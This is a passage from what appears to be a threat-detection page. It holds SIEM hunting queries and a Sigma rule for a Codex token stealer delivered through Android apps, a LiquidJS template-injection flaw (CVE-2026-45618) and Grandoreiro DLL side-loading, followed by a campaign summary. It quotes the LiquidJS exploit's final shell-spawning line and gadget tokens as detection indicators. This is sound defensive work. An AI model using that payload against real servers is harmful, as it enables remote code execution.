    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, RequestMethod=HttpMethod, RequestURL=Url, DestinationHostName=HttpHostName, UserAgent=HttpRequestHeaderUserAgent, DeviceVendor=EventVendor, DeviceProduct=EventProduct),
  (W3CIISLog
    | where TimeGenerated > ago(30d)
    | where csMethod =~ "POST"
    | where csUriStem has "/startlog" or csUserAgent startswith "codexui/"
    | project TimeGenerated, Computer, ClientIP=cIP, RequestMethod=csMethod, RequestURL=csUriStem, DestinationHostName=sSiteName, UserAgent=csUserAgent, DeviceVendor="Microsoft", DeviceProduct="IIS")
| order by TimeGenerated desc

[LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer) Delivery Medium
Hunts the mobile delivery vector - Play Store installs of the BrutalStrike author's apps that bootstrap the malicious codexui-android npm package inside a PRoot Linux userland. Both APKs share the app.anyclaw.* Kotlin namespace and register the anyclaw://auth/codex-callback URI scheme. Rationale: Article-specific package IDs gptos.intelligence.assistant and codex.app are named explicitly as the two Play Store apps that bootstrap the malicious codexui-android npm package on first launch. Kotlin namespace app.anyclaw.* and URI scheme anyclaw://auth/codex-callback are shared signatures across both APKs and are not used by any legitimate app. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens

[LLM] LiquidJS SSTI gadget tokens in inbound HTTP (CVE-2026-45618) Exploitation High
Hunts for LiquidJS template-injection PoC strings — `1|valueOf`, `r.context.scopes`, `r.liquid.parser`, `r.liquid.options.fs`, `assign __proto__`, `process.getBuiltinModule`, `child_process`, `execSync` — appearing in inbound URLs, query strings, referers, or form bodies served by IIS / App Service / WAF-fronted Node.js apps embedding LiquidJS templates. Rationale: Anchored to literal LiquidJS PoC tokens (`1|valueOf`, `r.context.scopes`, `r.liquid.parser`, `r.liquid.options.fs`, `assign __proto__`, `getBuiltinModule`, `child_process`, `execSync`, `fs.readFileSync`) — none of these are legitimate query-string contents and they are unique to the GHSA-gf2q-c269-pqgc gadget chain. Cross-checked against the GitHub advisory and the LiquidJS NPM page for fix version 10.26.0. Cross-checked against: • https://github.com/advisories/GHSA-gf2q-c269-pqgc • https://www.npmjs.com/package/liquidjs • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1059.007

   or AdditionalFields has_any ("1|valueOf","r.context.scopes","r.liquid.parser","__proto__","getBuiltinModule","child_process")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, LocalPort, AdditionalFields
| order by Timestamp desc

[LLM] Node.js web process spawning shell (LiquidJS RCE post-exploit) Exploitation High
Detects `node.exe` (or Linux `node`) — and IIS-hosted Node via `iisnode`/`w3wp.exe` running a Node app — spawning an interactive shell (`sh`, `bash`, `cmd.exe`, `powershell.exe`) immediately after the LiquidJS PoC executes `process.getBuiltinModule('child_process').execSync('sh', {stdio:'inherit'})`. This child-shell pattern is the deterministic post-exploit signal of CVE-2026-45618. Rationale: PoC ends with `process.getBuiltinModule('child_process').execSync('sh', {stdio:'inherit'})` — so the deterministic post-exploitation signal is `node` (or `w3wp.exe` hosting `iisnode`) becoming the parent of an interactive shell. node→sh is exceedingly rare in production: Node apps almost never `exec` a TTY-bearing shell. Cross-checked against the GHSA PoC body and standard Node.js production process trees. Cross-checked against: • https://github.com/advisories/GHSA-gf2q-c269-pqgc • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1190/
ATT&CKT1059 T1190 T1059.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe","node","w3wp.exe","iisnode.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","sh","bash","dash","zsh","ksh")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          InitiatingProcessTokenElevation, ProcessIntegrityLevel, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node.exe","\\node","/node","w3wp.exe","iisnode.exe")
| where TargetProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","\\sh","/sh","/bash","/dash","/zsh","\\bash.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine, EventVendor, EventProduct
| order by TimeGenerated desc

Grandoreiro Malware and BTMOB RAT Campaigns Target Windows and Android Users

The Hacker News
2026-05-27 12 use cases 7 techniques 5 kill-chain phases detected

Latin America and Europe become the target of two banking trojan campaigns that are designed to infect Windows and Android devices with Grandoreiro and BTMOB malware, respectively. That's according to new findings from WatchGuard and ESET, which have observed the two malware families being used to single out companies in Spain, Portugal, and Mexico, as well as mobile users in Brazil. Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Grandoreiro Mediafire VBScript dropper spawning executable · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Grandoreiro Malware and BTMOB RAT Campaigns Target Windows and Android Users
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Grandoreiro DLL side-load via trojanized open-source library DLLs
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Grandoreiro WebRTC/STUN C2 from non-conferencing process · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → OAuth consent / suspicious app grant
[LLM] Grandoreiro DLL side-load via trojanized open-source library DLLs Installation Medium
Hunts loading/dropping of the four legitimate-named library DLLs Grandoreiro abuses for side-loading (mingwm10.dll, libwebp.dll, libffi-6.dll, libpng15.dll) from user-writable directories rather than their normal install location. WatchGuard reports these Delphi-built DLLs are dropped next to signed software and side-loaded to launch the banker. Rationale: Uses the exact four DLL filenames WatchGuard attributes to this Grandoreiro side-loading wave; the user-writable-path constraint separates the trojanized drops from the same DLLs legitimately shipped inside Program Files. Cross-checked WatchGuard via thehackernews summary and MITRE S0531. Cross-checked against: • https://attack.mitre.org/software/S0531/ • https://securelist.com/grandoreiro-banking-trojan/114257/ • https://thehackernews.com/2026/05/grandoreiro-malware-and-btmob-rat.html
ATT&CKT1574.002
Data sourcesEndpoint.Filesystem
DeviceImageLoadEvents
| where Timestamp > ago(14d)
| where FileName in~ ("mingwm10.dll","libwebp.dll","libffi-6.dll","libpng15.dll")
| where FolderPath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\Public\", @"\ProgramData\")
| where FolderPath !startswith @"C:\Program Files" and FolderPath !startswith @"C:\Windows"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
title: Grandoreiro Trojanized Library DLL Loaded From User-Writable Path
id: 6f3c1a92-2d44-4b7e-9c1a-7a0e2f8b1c34
description: Detects load of open-source library DLLs (mingwm10.dll, libwebp.dll, libffi-6.dll, libpng15.dll) abused by Grandoreiro for DLL side-loading, from user-writable directories instead of their normal install location.
references:
  - https://thehackernews.com/2026/05/grandoreiro-malware-and-btmob-rat.html
  - https://attack.mitre.org/software/S0531/
author: SOC Detection Engineering
date: 2026/05/27
tags:

logsource:
  category: image_load
  product: windows
detection:
  selection:
    ImageLoaded|endswith:
      - '\mingwm10.dll'
      - '\libwebp.dll'
      - '\libffi-6.dll'
      - '\libpng15.dll'
  user_writable:
    ImageLoaded|contains:
      - '\Users\'
      - '\AppData\'
      - '\Temp\'
      - '\Downloads\'

level: medium
source:windows.sysmon @EventID:11 @TargetFilename:(*\\mingwm10.dll OR *\\libwebp.dll OR *\\libffi-6.dll OR *\\libpng15.dll OR *\\MINGWM10.DLL OR *\\LIBWEBP.DLL OR *\\LIBFFI-6.DLL OR *\\LIBPNG15.DLL) @TargetFilename:(*\\Users\\* OR *\\AppData\\* OR *\\Temp\\* OR *\\Downloads\\* OR *\\ProgramData\\*)
#event_simpleName=FileWritten
| TargetFileName=/\\(mingwm10|libwebp|libffi-6|libpng15)\.dll$/i
| regex("\\\\(Users|AppData|Temp|Downloads|Public|ProgramData)\\\\", field=TargetFileName)
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())

[LLM] Grandoreiro Mediafire VBScript dropper spawning executable Delivery Medium
Hunts the WatchGuard-described delivery chain: a ZIP/obfuscated VBScript downloaded from Mediafire that launches an executable (the fake 'update Adobe Reader' loader) from a user-writable path. Correlates the Mediafire file origin with a wscript/cscript-spawned EXE on the same host within an hour. Rationale: Combines the WatchGuard-named Mediafire hosting origin with the obfuscated-VBScript-launches-EXE behaviour; the 1h temporal join to a Mediafire-origin VBS/ZIP makes the Defender variant high-fidelity rather than a generic wscript->exe hunt. Sentinel/Falcon variants drop the origin pivot (no MOTW URL in those schemas). Cross-checked against: • https://securelist.com/grandoreiro-banking-trojan/114257/ • https://thehackernews.com/2026/05/grandoreiro-malware-and-btmob-rat.html
ATT&CKT1566.002 T1059.005 T1204.002
Data sourcesEndpoint.Processes
let drops = DeviceFileEvents
| where Timestamp > ago(14d)
| where FileOriginUrl has "mediafire.com" or FileOriginReferrerUrl has "mediafire.com"
| where FileName endswith ".zip" or FileName endswith ".vbs" or FileName endswith ".js"
| project DeviceId, DroppedFile = FileName, FileOriginUrl, DropTime = Timestamp;
DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("wscript.exe","cscript.exe")
| where FileName endswith ".exe"
| where FolderPath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\Public\")
| where AccountName !endswith "$"
| join kind=inner drops on DeviceId
| where Timestamp between (DropTime .. DropTime + 1h)
| project DropTime, ExecTime = Timestamp, DeviceName, AccountName, DroppedFile, FileOriginUrl, InitiatingProcessCommandLine, FileName, FolderPath, ProcessCommandLine, SHA256
| order by ExecTime desc
SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 4688
| where ParentProcessName endswith "\\wscript.exe" or ParentProcessName endswith "\\cscript.exe"
| where NewProcessName endswith ".exe"
| where NewProcessName has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\Public\")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
